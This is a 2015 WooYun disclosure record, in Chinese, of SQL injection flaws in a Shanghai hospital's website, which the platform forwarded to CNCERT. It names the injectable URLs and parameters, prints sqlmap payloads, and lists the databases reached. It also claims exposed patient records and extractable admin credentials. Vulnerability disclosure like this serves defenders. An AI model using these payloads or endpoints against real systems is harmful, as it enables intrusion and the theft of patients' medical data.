{"id": 35506, "wybug_id": "wooyun-2015-0103770", "wybug_title": "上海市某医院网站多处SQL注入，大量病人信息泄露", "wybug_corp": "上海瑞金医院", "wybug_author": "路人甲", "wybug_date": "2015-03-27 10:39", "wybug_open_date": "2015-05-15 11:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-15：\t细节向公众公开  简要描述： RT 详细说明：  注入点1、\nhttp://www.rjh.com.cn/rjhsearch/Pages/Detail.aspx?yggh=J9418\n2、\nhttp://www.rjh.com.cn/RUIJIN_Portal_ClickCount_WebSite/ClickOrder.aspx?PortalType=rjh\n3、\nhttp://www.rjh.com.cn/mzynjbapp/Expert/OfficeList.aspx?OfficeID=4160000\n   漏洞证明：  以第一个为例：\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: yggh    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: yggh=J9418' AND 5506=5506 AND 'YGzo'='YGzo    Type: UNION query    Title: Generic UNION query (NULL) - 7 columns    Payload: yggh=J9418' UNION ALL SELECT NULL,NULL,NULL,CHAR(58) CHAR(119) CHAR(103) CHAR(114) CHAR(58) CHAR(76) CHAR(104) CHAR(89) CHAR(77) CHAR(115) CHAR(115) CHAR(104) CHAR(100) CHAR(115) CHAR(77) CHAR(58) CHAR(116) CHAR(98) CHAR(113) CHAR(58),NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: yggh=J9418'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: yggh=J9418' WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000available databases [28]:[*] CMS2003[*] crf[*] Forums[*] HIS[*] hytz[*] IntraForums[*] LWPortalDB[*] LWportalSite[*] LWXQSL[*] LZX_hytz[*] master[*] model[*] msdb[*] Northwind[*] OGManagement[*] PharmForums[*] PortalASPDB[*] pubs[*] rj_pxb[*] RJPortalDB[*] rjyy_jyk[*] RuijinOA[*] SPS01_Config_db[*] tempdb[*] webdbdns,1434[*] 瑞金内网门户1_PROF[*] 瑞金内网门户1_SERV[*] 瑞金内网门户1_SITE\n其中“RJPortalDB”数据库中“RJGH_User”表中含有大量病人信息\n\n具体数据都不深入了。。其中“crf”数据库中可以爆出管理员账号密码，顺利登入后台\n\nPs:第二个注入点可以爆出99个数据库\navailable databases [99]:[*] ChuKeAssessment[*] db_ExamOnline[*] EndocrineQuestionnaire[*] EndocrineQuestionnaire_JS[*] ExcellentManagerApply[*] FORMDB[*] Forum[*] HF_HRDB[*] HIS_JBDM_DB[*] HR_ExcellentYouthAssessment[*] HR_PerformanceAssessment[*] HR_WageQuery[*] HRDB[*] HRDB_LOG[*] IntertidCMS[*] IntertidPermissions[*] IntertidWebApp[*] master[*] model[*] msdb[*] OA_AbroadRequest[*] OA_AdvanceRequest[*] OA_APPDB[*] OA_ArchiveList[*] OA_AudioVisual[*] OA_Budget[*] OA_ClinicalReimbursement[*] OA_ClinicScheduling[*] OA_CommunistPartyMemberManage[*] OA_ConsultRequest[*] OA_CPDCirculation[*] OA_DoctorSelectCourse[*] OA_DoctorsScheduling[*] OA_DonateApprove[*] OA_EndocrineDataMaintain[*] OA_EndocrineResearchManagement[*] OA_EnrytSystem[*] OA_EthicExam[*] OA_GuardSafetyManagement[*] OA_HospitalScheduling[*] OA_HREvaluation[*] OA_HRNEEvaluation[*] OA_Infection[*] OA_MiniApplication[*] OA_NursePapers[*] OA_NurseScheduling[*] OA_NurseSelectCourse[*] OA_NursingIncidentReport[*] OA_OnlineTraining[*] OA_OutApprove[*] OA_OutWorkingRequest[*] OA_PersonModule[*] OA_Platform[*] OA_PSApplication[*] OA_Reimbursement[*] OA_Resignation[*] OA_Satisfaction[*] OA_StudentSelectCourse[*] OA_Survey[*] OA_SurveyLead[*] OA_Task[*] OA_Task135[*] OA_TeachingAssessment[*] OA_Unions[*] OA_Vote[*] Portal_Application[*] PS_Conference[*] PS_Contact[*] PS_EmsSms[*] PS_ExchangeApp[*] PS_Framework[*] PS_LogService[*] PS_Monitor[*] PS_Portal[*] PS_SchedulingService[*] PS_SecurityService[*] PS_Task[*] PS_Workflow[*] Questionnaire[*] ReportServer[*] ReportServerNew[*] ReportServerNewTempDB[*] ReportServerTempDB[*] ReservationPlatform[*] RJCRMAPPDB[*] RJDJDNT[*] RJOA[*] RJWZ[*] RJWZCY[*] RSSDB[*] ruijinCMS2010[*] RuijinHRApplication[*] RuijinResume_WUXI_FYJ[*] RuijinResume_WUXI_YJ[*] ServicePlatform[*] tempdb[*] Test[*] TNBDCWJ[*] VolunteerServiceCenter\n其中数据肯定很多。。。就不深入了   修复方案：  你懂的   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-03-31 11:22 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给上海分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}